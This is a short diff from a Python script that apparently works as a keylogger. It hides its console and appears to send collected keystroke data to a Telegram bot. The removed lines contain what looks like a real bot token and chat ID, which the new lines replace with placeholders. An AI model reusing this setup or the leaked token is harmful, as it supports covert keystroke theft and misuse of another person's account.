@@ -36,8 +36,8 @@ if win32api.GetLastError() == winerror.ERROR_ALREADY_EXISTS:
 x=''
 keyData=''
 count=0
-bot = telepot.Bot('564405892:AAFsbYtzqP7eqzgmKhkVBAf0ViVwHzueYxQ')
-teleID = '418097602'
+bot = telepot.Bot('"PUT API KEY HERE"')
+teleID = 'PUT TELEGRAM ID HERE'
 
 #Hide Console
 def hide():
